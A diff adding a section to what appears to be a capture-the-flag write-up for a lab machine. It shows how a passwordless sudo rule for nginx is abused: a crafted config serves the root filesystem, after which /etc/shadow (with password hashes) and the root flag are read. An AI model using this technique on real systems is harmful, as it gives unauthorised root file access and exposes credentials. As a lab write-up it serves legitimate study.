@@ -200,5 +200,110 @@ User john may run the following commands on webmaster:
     (ALL : ALL) NOPASSWD: /usr/sbin/nginx
 ```
 
+#### Abuse
+```bash
+john@webmaster:/tmp$ nano evil_nginx.conf
+john@webmaster:/tmp$ cat evil_nginx.conf 
+user root;
+worker_processes 1;
+pid /tmp/nginx.pid;  
+error_log /tmp/nginx_error.log;
+
+events {
+        worker_connections 1024;
+}
+ 
+http {
+        server {
+                listen 4444;
+                root /;
+                autoindex on;
+
+                location / {
+                }
+        }
+}
+john@webmaster:/tmp$ sudo /usr/sbin/nginx -c /tmp/evil_nginx.conf
+john@webmaster:/tmp$ curl http://localhost:4444/etc/shadow
+-bash: curl: command not found
+john@webmaster:/tmp$ wget -q -O - http://localhost:4444/etc/shadow
+root:$6$zncDavtVRmUD0pQg$/YQx2Q7DIeog3I7I4FKAzf3Y5sZvcOjU84JcyiuboB7hP21EpijheWcmhH0wrFESREBp91pnI9LtdrLUO8OTn0:18601:0:99999:7:::
+daemon:*:18600:0:99999:7:::
+bin:*:18600:0:99999:7:::
+sys:*:18600:0:99999:7:::
+sync:*:18600:0:99999:7:::
+games:*:18600:0:99999:7:::
+man:*:18600:0:99999:7:::
+lp:*:18600:0:99999:7:::
+mail:*:18600:0:99999:7:::
+news:*:18600:0:99999:7:::
+uucp:*:18600:0:99999:7:::
+proxy:*:18600:0:99999:7:::
+www-data:*:18600:0:99999:7:::
+backup:*:18600:0:99999:7:::
+list:*:18600:0:99999:7:::
+irc:*:18600:0:99999:7:::
+gnats:*:18600:0:99999:7:::
+nobody:*:18600:0:99999:7:::
+_apt:*:18600:0:99999:7:::
+systemd-timesync:*:18600:0:99999:7:::
+systemd-network:*:18600:0:99999:7:::
+systemd-resolve:*:18600:0:99999:7:::
+messagebus:*:18600:0:99999:7:::
+john:$6$DiPfbtLNSlIqjBs5$EJO2mGyso/jyUPY1hTXbMB8kFfNcKW5ijJIRFribgaw.O8ukOfnab.Wv6TcB6r1jrIPNnpIkI8hz0Z/E5MjfT/:18601:0:99999:7:::
+systemd-coredump:!!:18600::::::
+sshd:*:18600:0:99999:7:::
+bind:*:18600:0:99999:7:::
+```
+```bash
+john@webmaster:/tmp$ wget -q -O - http://localhost:4444/
+<html>
+<head><title>Index of /</title></head>
+<body bgcolor="white">
+<h1>Index of /</h1><hr><pre><a href="../">../</a>
+<a href="bin/">bin/</a>                                               04-Dec-2020 20:17                   -
+<a href="boot/">boot/</a>                                              04-Dec-2020 20:04                   -
+<a href="dev/">dev/</a>                                               09-Jun-2026 07:27                   -
+<a href="etc/">etc/</a>                                               09-Jun-2026 07:27                   -
+<a href="home/">home/</a>                                              04-Dec-2020 20:04                   -
+<a href="lib/">lib/</a>                                               04-Dec-2020 20:17                   -
+<a href="lib32/">lib32/</a>                                             04-Dec-2020 19:59                   -
+<a href="lib64/">lib64/</a>                                             04-Dec-2020 19:59                   -
+<a href="libx32/">libx32/</a>                                            04-Dec-2020 19:59                   -
+<a href="lost%2Bfound/">lost+found/</a>                                        04-Dec-2020 19:59                   -
+<a href="media/">media/</a>                                             04-Dec-2020 19:59                   -
+<a href="mnt/">mnt/</a>                                               04-Dec-2020 19:59                   -
+<a href="opt/">opt/</a>                                               04-Dec-2020 19:59                   -
+<a href="proc/">proc/</a>                                              09-Jun-2026 07:27                   -
+<a href="root/">root/</a>                                              05-Dec-2020 09:50                   -
+<a href="run/">run/</a>                                               09-Jun-2026 07:49                   -
+<a href="sbin/">sbin/</a>                                              04-Dec-2020 20:17                   -
+<a href="srv/">srv/</a>                                               04-Dec-2020 19:59                   -
+<a href="sys/">sys/</a>                                               09-Jun-2026 07:27                   -
+<a href="tmp/">tmp/</a>                                               09-Jun-2026 08:39                   -
+<a href="usr/">usr/</a>                                               04-Dec-2020 19:59                   -
+<a href="var/">var/</a>                                               04-Dec-2020 20:17                   -
+<a href="initrd.img">initrd.img</a>                                         04-Dec-2020 20:02            25843579
+<a href="initrd.img.old">initrd.img.old</a>                                     04-Dec-2020 20:02            25815961
+<a href="vmlinuz">vmlinuz</a>                                            18-Oct-2020 08:43             5278960
+<a href="vmlinuz.old">vmlinuz.old</a>                                        07-Jun-2020 15:42             5274864
+</pre><hr></body>
+</html>
+john@webmaster:/tmp$ wget -q -O - http://localhost:4444/root
+<html>
+<head><title>Index of /root/</title></head>
+<body bgcolor="white">
+<h1>Index of /root/</h1><hr><pre><a href="../">../</a>
+<a href="flag.sh">flag.sh</a>                                            05-Dec-2020 09:49                1920
+<a href="root.txt">root.txt</a>                                           05-Dec-2020 09:50                  13
+</pre><hr></body>
+</html>
+```
+
+#### Flags
+```bash
+john@webmaster:/tmp$ wget -q -O - http://localhost:4444/root/root.txt
+HMVnginxpwnd
+```
 
 ***You are welcome!***
